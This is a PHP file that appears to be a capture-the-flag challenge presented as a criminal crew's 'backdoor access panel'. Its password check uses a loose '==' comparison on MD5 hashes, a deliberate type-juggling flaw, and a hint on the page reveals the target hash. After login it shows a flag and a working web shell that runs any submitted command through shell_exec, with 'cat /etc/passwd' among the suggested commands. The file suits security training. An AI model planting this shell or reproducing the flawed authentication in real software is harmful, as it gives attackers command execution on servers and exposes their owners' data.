<?php
// Ogodwo Crew Backdoor - Tchackatou v1.0
// WARNING: For authorized access only!

session_start();
error_reporting(0);

// Configuration
$correct_password_hash = "0e215962017"; // MD5 hash that looks like scientific notation
$flag = "OGODWO{md5_c0ll1s10n_4r3_fun_r1ght?}";

// Check if already authenticated
if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) {
    showBackdoor();
    exit();
}

// Handle login attempt
if (isset($_POST['password'])) {
    $input_password = $_POST['password'];
    $input_hash = md5($input_password);
    
    // Vulnerable comparison - MD5 type juggling
    // Both hashes that start with "0e" followed by digits are treated as 0 in loose comparison
    if ($input_hash == $correct_password_hash) {
        $_SESSION['authenticated'] = true;
        showBackdoor();
        exit();
    } else {
        $error = "Access Denied! Invalid password.";
    }
}

// Login form
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ogodwo Tchackatou - Backdoor Access</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
            font-family: 'Courier New', monospace;
            color: #00ff00;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .backdoor-container {
            background: rgba(0, 0, 0, 0.8);
            border: 2px solid #00ff00;
            border-radius: 10px;
            padding: 40px;
            max-width: 500px;
            width: 90%;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .header h1 {
            color: #ff0000;
            font-size: 2em;
            text-shadow: 0 0 10px #ff0000;
            margin-bottom: 10px;
        }
        
        .header p {
            color: #00ff00;
            font-size: 1.2em;
        }
        
        .login-form {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }
        
        .form-group {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        
        label {
            color: #00ff00;
            font-size: 1.1em;
        }
        
        input[type="password"] {
            background: #0a0a0a;
            border: 1px solid #00ff00;
            color: #00ff00;
            padding: 12px;
            font-family: 'Courier New', monospace;
            font-size: 1em;
            border-radius: 5px;
        }
        
        input[type="password"]:focus {
            outline: none;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
        }
        
        button {
            background: #00ff00;
            color: #0a0a0a;
            border: none;
            padding: 15px;
            font-family: 'Courier New', monospace;
            font-size: 1.1em;
            font-weight: bold;
            cursor: pointer;
            border-radius: 5px;
            transition: all 0.3s;
        }
        
        button:hover {
            background: #00cc00;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.6);
        }
        
        .error {
            background: rgba(255, 0, 0, 0.2);
            border: 1px solid #ff0000;
            color: #ff0000;
            padding: 15px;
            border-radius: 5px;
            text-align: center;
        }
        
        .hint {
            background: rgba(255, 255, 0, 0.1);
            border: 1px solid #ffff00;
            color: #ffff00;
            padding: 15px;
            border-radius: 5px;
            font-size: 0.9em;
            margin-top: 20px;
        }
        
        .hint-title {
            font-weight: bold;
            margin-bottom: 5px;
        }
        
        code {
            background: #0a0a0a;
            padding: 2px 5px;
            border-radius: 3px;
            color: #ff00ff;
        }
    </style>
</head>
<body>
    <div class="backdoor-container">
        <div class="header">
            <h1>☠️ OGODWO TCHACKATOU ☠️</h1>
            <p>Backdoor Access Panel</p>
        </div>
        
        <?php if (isset($error)): ?>
            <div class="error"><?php echo htmlspecialchars($error); ?></div>
        <?php endif; ?>
        
        <form method="POST" class="login-form">
            <div class="form-group">
                <label for="password">🔒 Enter Access Password:</label>
                <input type="password" id="password" name="password" required autocomplete="off">
            </div>
            <button type="submit">ACCESS BACKDOOR</button>
        </form>
        
        <div class="hint">
            <div class="hint-title">💡 Developer Note:</div>
            Password hash: <code><?php echo $correct_password_hash; ?></code><br>
            Comparison type: <code>Loose (==)</code>
        </div>
    </div>
</body>
</html>

<?php
function showBackdoor() {
    global $flag;
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Ogodwo Tchackatou - Access Granted</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
                font-family: 'Courier New', monospace;
                color: #00ff00;
                min-height: 100vh;
                padding: 20px;
            }
            
            .terminal {
                background: rgba(0, 0, 0, 0.9);
                border: 2px solid #00ff00;
                border-radius: 10px;
                padding: 20px;
                max-width: 1200px;
                margin: 0 auto;
                box-shadow: 0 0 30px rgba(0, 255, 0, 0.4);
            }
            
            .terminal-header {
                border-bottom: 1px solid #00ff00;
                padding-bottom: 15px;
                margin-bottom: 20px;
            }
            
            .terminal-header h1 {
                color: #00ff00;
                font-size: 1.5em;
                text-shadow: 0 0 10px #00ff00;
            }
            
            .success-message {
                background: rgba(0, 255, 0, 0.2);
                border: 1px solid #00ff00;
                padding: 20px;
                border-radius: 5px;
                margin-bottom: 30px;
                text-align: center;
            }
            
            .success-message h2 {
                color: #00ff00;
                font-size: 2em;
                margin-bottom: 15px;
            }
            
            .flag {
                background: #0a0a0a;
                border: 2px solid #ffff00;
                color: #ffff00;
                padding: 20px;
                border-radius: 5px;
                font-size: 1.5em;
                text-align: center;
                margin: 20px 0;
                text-shadow: 0 0 10px #ffff00;
            }
            
            .command-panel {
                background: #0a0a0a;
                border: 1px solid #00ff00;
                padding: 20px;
                border-radius: 5px;
                margin-top: 20px;
            }
            
            .command-title {
                color: #00ff00;
                font-size: 1.2em;
                margin-bottom: 15px;
                font-weight: bold;
            }
            
            form {
                display: flex;
                gap: 10px;
                margin-bottom: 20px;
            }
            
            input[type="text"] {
                flex: 1;
                background: #0a0a0a;
                border: 1px solid #00ff00;
                color: #00ff00;
                padding: 10px;
                font-family: 'Courier New', monospace;
                border-radius: 3px;
            }
            
            button {
                background: #00ff00;
                color: #0a0a0a;
                border: none;
                padding: 10px 20px;
                font-family: 'Courier New', monospace;
                font-weight: bold;
                cursor: pointer;
                border-radius: 3px;
            }
            
            .output {
                background: #000;
                border: 1px solid #00ff00;
                padding: 15px;
                border-radius: 3px;
                min-height: 200px;
                white-space: pre-wrap;
                word-wrap: break-word;
            }
            
            .logout {
                text-align: center;
                margin-top: 20px;
            }
            
            .logout a {
                color: #ff0000;
                text-decoration: none;
                font-size: 1.1em;
            }
            
            .logout a:hover {
                text-shadow: 0 0 10px #ff0000;
            }
        </style>
    </head>
    <body>
        <div class="terminal">
            <div class="terminal-header">
                <h1>☠️ OGODWO TCHACKATOU - BACKDOOR ACCESS GRANTED ☠️</h1>
            </div>
            
            <div class="success-message">
                <h2>✅ ACCESS GRANTED ✅</h2>
                <p>Welcome to Ogodwo Crew's Backdoor System</p>
                <p>You successfully exploited the MD5 type juggling vulnerability!</p>
            </div>
            
            <div class="flag">
                🚩 FLAG: <?php echo htmlspecialchars($flag); ?> 🚩
            </div>
            
            <div class="command-panel">
                <div class="command-title">⚡ Remote Command Execution Panel</div>
                <form method="POST">
                    <input type="text" name="cmd" placeholder="Enter system command..." autocomplete="off">
                    <button type="submit">EXECUTE</button>
                </form>
                
                <div class="output">
<?php
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    echo "$ " . htmlspecialchars($cmd) . "\n\n";
    
    // Execute command (for CTF simulation - be careful in production!)
    if (function_exists('shell_exec')) {
        $output = shell_exec($cmd . " 2>&1");
        echo htmlspecialchars($output);
    } else {
        echo "Command execution is disabled on this server.\n";
        echo "But you got the flag anyway! 🎉";
    }
} else {
    echo "Ready to execute commands...\n";
    echo "Try: whoami, ls, pwd, cat /etc/passwd, etc.\n";
}
?>
                </div>
            </div>
            
            <div class="logout">
                <a href="?logout=1">🔓 LOGOUT</a>
            </div>
        </div>
    </body>
    </html>
    <?php
}

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit();
}
?>